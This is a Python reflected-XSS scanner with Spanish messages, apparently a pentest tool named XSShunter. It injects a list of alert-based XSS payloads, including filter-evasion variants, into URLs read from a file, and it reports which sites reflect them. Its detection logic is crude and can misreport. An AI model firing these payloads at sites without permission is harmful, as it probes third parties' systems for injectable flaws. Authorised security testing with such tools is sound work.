import requests
from bs4 import BeautifulSoup
import urllib.parse
import re
import argparse
from colorama import Fore, Style, init, Back
import csv
from datetime import datetime
import html

# Inicializar colorama
init(autoreset=True)

# Definir una lista de payloads XSS con técnicas de evasión
payloads = [
    "<script>alert('XSS')</script>",
    "%3Cscript%3Ealert('XSS')%3C/script%3E",
    "&lt;script&gt;alert('XSS')&lt;/script&gt;",
    "<scr<script>ipt>alert('XSS')</scr<script>ipt>",
    "<scr<!-- -->ipt>alert('XSS')</scr<!-- -->ipt>",
    "<img src=x onerror=alert('XSS')>",
    "<a href=\"data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4=\">Click me</a>",
    '<img src="invalid" onerror="alert(\'XSS\')">',
    '<script src="invalid.js" onerror="alert(\'XSS\')"></script>',
    '<body onerror="alert(\'XSS\')"><img src="invalid"></body>',
    '<input type="image" src="invalid" onerror="alert(\'XSS\')">',
    '<video onerror="alert(\'XSS\')"><source src="invalid.mp4" type="video/mp4"></video>',
    '<audio src="invalid.mp3" onerror="alert(\'XSS\')"></audio>',
    '<link rel="stylesheet" href="invalid.css" onerror="alert(\'XSS\')">',
    '<frame src="invalid.html" onerror="alert(\'XSS\')"></frame>',
    '<iframe src="invalid.html" onerror="alert(\'XSS\')"></iframe>',
    '<object data="invalid.swf" onerror="alert(\'XSS\')"></object>',
    '<button onclick="alert(\'XSS\')">Click me</button>',
    '<div onclick="alert(\'XSS\')">Click here</div>',
    '<a href="#" onclick="alert(\'XSS\')">Click this link</a>',
    '<img src="valid.jpg" onclick="alert(\'XSS\')">',
    '<p onclick="alert(\'XSS\')">Click this paragraph</p>',
    '<span onclick="alert(\'XSS\')">Click this span</span>',
    '<td onclick="alert(\'XSS\')">Click this table cell</td>',
    '<li onclick="alert(\'XSS\')">Click this list item</li>',
    '<h1 onclick="alert(\'XSS\')">Click this header</h1>',
    '<label onclick="alert(\'XSS\')">Click this label</label>',
    '<body onload="alert(\'XSS\')">',
    '<iframe src="valid.html" onload="alert(\'XSS\')"></iframe>',
    '<img src="valid.jpg" onload="alert(\'XSS\')">',
    '<div onload="alert(\'XSS\')"></div>',  # Nota: onload en div solo funciona en algunos navegadores
    '<script onload="alert(\'XSS\')" src="valid.js"></script>',
    '<input type="text" onload="alert(\'XSS\')" value="Test">',
    '<embed src="valid.swf" onload="alert(\'XSS\')"></embed>',
    '<iframe onload="alert(\'XSS\')"></iframe>',  # sin src, depende del navegador
    '<object type="application/x-shockwave-flash" data="valid.swf" onload="alert(\'XSS\')"></object>',
    '<link rel="stylesheet" href="valid.css" onload="alert(\'XSS\')">'
]

def is_payload_executed(response_text, payload):
    if isinstance(response_text, bytes):
        response_text = response_text.decode('utf-8', errors='ignore')
    if not isinstance(response_text, str):
        response_text = str(response_text)
        
    soup = BeautifulSoup(response_text, 'html.parser')

    if payload in str(soup):
        scripts = soup.find_all('script')
        for script in scripts:
            if payload in script.text:
                return True

        attributes = soup.find_all(True, {"onerror": True, "onclick": True, "onload": True})
        for tag in attributes:
            for attr, value in tag.attrs.items():
                if isinstance(value, list):
                    value = ' '.join(value)
                if payload in value:
                    return True

        for tag in soup.find_all(True):
            for attr, value in tag.attrs.items():
                if isinstance(value, list):
                    value = ' '.join(value)
                if re.search(r'javascript:|data:text/html', value, re.IGNORECASE):
                    return True

    return False

def analyze_headers(headers):
    security_headers = {
        'Content-Security-Policy': 'CSP detectado. Ayuda a prevenir XSS.',
        'X-XSS-Protection': 'Protección XSS detectada. Ayuda a prevenir XSS en navegadores antiguos.',
        'X-Content-Type-Options': 'Protección contra mime-sniffing detectada.',
        'Strict-Transport-Security': 'HSTS detectado. Ayuda a prevenir ataques de downgrade de protocolo.'
    }
    
    findings = []
    for header, message in security_headers.items():
        if header in headers:
            findings.append(f"{Fore.YELLOW}Analizando header: {Fore.WHITE}{header} - {Fore.GREEN}Detectado")
        else:
            findings.append(f"{Fore.YELLOW}Analizando header: {Fore.WHITE}{header} - {Fore.RED}No detectado")
    
    if not findings:
        findings.append(f"{Fore.YELLOW}No se detectaron headers de seguridad relevantes.")
    
    return findings

def test_xss(url, tested_urls, vulnerable_urls):
    headers_analyzed = False
    for payload in payloads:
        test_url = url.replace("FUZZ", urllib.parse.quote(payload))
        
        if test_url in tested_urls:
            continue
        
        response = requests.get(test_url)
        
        if response.status_code == 200:
            with open('response.html', 'w', encoding='utf-8') as file:
                file.write(response.text)
            
            if not headers_analyzed:
                header_findings = analyze_headers(response.headers)
                for finding in header_findings:
                    print(finding)
                headers_analyzed = True
            
            if is_payload_executed(response.text, payload):
                print(f"{Style.BRIGHT}{Fore.GREEN}[+] Vulnerabilidad XSS detectada en: {Fore.MAGENTA}{test_url}")
                vulnerable_urls.append((test_url, payload))
            
            tested_urls.add(test_url)
        elif response.status_code == 404:
            print(f"{Back.BLUE}[!] Error: Código de estado 404 para la URL {test_url}")
        else:
            print(f"{Back.BLUE}[!] Error: Código de estado {response.status_code} para la URL {test_url}")

def test_urls_from_file(file_path):
    tested_urls = set()
    vulnerable_urls = []
    with open(file_path, 'r') as file:
        urls = [url.strip() for url in file.readlines()]
    
    for url in urls:
        print(f"{Back.CYAN}Probando la URL: {url}")
        test_xss(url, tested_urls, vulnerable_urls)
        print("----" * 10)

    return tested_urls, vulnerable_urls

def save_results(tested_urls, vulnerable_urls, output_format):
    timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
    if output_format == 'csv':
        save_results_to_csv(tested_urls, vulnerable_urls, f"results_{timestamp}.csv")
    elif output_format == 'html':
        save_results_to_html(tested_urls, vulnerable_urls, f"results_{timestamp}.html")
    elif output_format == 'txt':
        save_results_to_txt(tested_urls, vulnerable_urls, f"results_{timestamp}.txt")
    else:
        print(f"{Fore.RED}Formato de salida no soportado: {output_format}")

def save_results_to_csv(tested_urls, vulnerable_urls, filename):
    with open(filename, 'w', newline='') as csvfile:
        writer = csv.writer(csvfile)
        writer.writerow(["URL", "Payload"])
        for url in tested_urls:
            payload = next((p for u, p in vulnerable_urls if u == url), "No vulnerable")
            writer.writerow([url, payload])

def save_results_to_html(tested_urls, vulnerable_urls, filename):
    with open(filename, 'w') as htmlfile:
        htmlfile.write("""
        <!DOCTYPE html>
        <html lang="en">
        <head>
            <meta charset="UTF-8">
            <meta name="viewport" content="width=device-width, initial-scale=1.0">
            <title>Resultados de Vulnerabilidades XSS</title>
            <style>
                body { font-family: Arial, sans-serif; margin: 20px; background-color: #f4f4f9; color: #333; }
                table { border-collapse: collapse; width: 100%; margin-top: 20px; }
                th, td { border: 1px solid #ddd; text-align: left; padding: 8px; }
                th { background-color: #4CAF50; color: white; }
                tr:nth-child(even) { background-color: #f2f2f2; }
                h1 { color: #4CAF50; }
            </style>
        </head>
        <body>
            <h1>Resultados de Vulnerabilidades XSS</h1>
            <table>
                <tr><th>URL</th><th>Payload</th></tr>
        """)
        for url in tested_urls:
            payload = next((p for u, p in vulnerable_urls if u == url), "No vulnerable")
            escaped_payload = html.escape(payload)
            htmlfile.write(f"<tr><td>{url}</td><td>{escaped_payload}</td></tr>")
        htmlfile.write("""
            </table>
        </body>
        </html>
        """)

def save_results_to_txt(tested_urls, vulnerable_urls, filename):
    with open(filename, 'w') as txtfile:
        for url in tested_urls:
            payload = next((p for u, p in vulnerable_urls if u == url), "No vulnerable")
            txtfile.write(f"URL: {url}\nPayload: {payload}\n\n")

def main():
    print(f"""{Style.BRIGHT}{Fore.GREEN}
    
██╗  ██╗███████╗███████╗██╗  ██╗██╗   ██╗███╗   ██╗████████╗███████╗██████╗ ██╗  ██╗
╚██╗██╔╝██╔════╝██╔════╝██║  ██║██║   ██║████╗  ██║╚══██╔══╝██╔════╝██╔══██╗╚██╗██╔╝
 ╚███╔╝ ███████╗███████╗███████║██║   ██║██╔██╗ ██║   ██║   █████╗  ██████╔╝ ╚███╔╝ 
 ██╔██╗ ╚════██║╚════██║██╔══██║██║   ██║██║╚██╗██║   ██║   ██╔══╝  ██╔══██╗ ██╔██╗ 
██╔╝ ██╗███████║███████║██║  ██║╚██████╔╝██║ ╚████║   ██║   ███████╗██║  ██║██╔╝ ██╗
╚═╝  ╚═╝╚══════╝╚══════╝╚═╝  ╚═╝ ╚═════╝ ╚═╝  ╚═══╝   ╚═╝   ╚══════╝╚═╝  ╚═╝╚═╝  ╚═╝
- - - - - - - - - - - - - - - - - - by Mr-r00t - - - - - - - - - - - - - - - - - - - - 
    """)
    parser = argparse.ArgumentParser(description='Prueba de vulnerabilidades XSS reflejadas.')
    parser.add_argument('--urls', required=True, help='Archivo de texto con las URLs a probar')
    parser.add_argument('--output', choices=['csv', 'html', 'txt'], default='txt', help='Formato de salida (csv, html, txt)')
    args = parser.parse_args()

    tested_urls, vulnerable_urls = test_urls_from_file(args.urls)

    if vulnerable_urls:
        print(f"\n{Back.CYAN}URLs vulnerables a XSS detectadas:")
        for url, payload in vulnerable_urls:
            print(f"{Style.BRIGHT}{Fore.GREEN}[+] URL: {Fore.MAGENTA}{url}")
    else:
        print(f"\n{Style.BRIGHT}{Fore.RED}[-] No se detectaron URLs vulnerables a XSS.")

    save_results(tested_urls, vulnerable_urls, args.output)

if __name__ == "__main__":
    main()
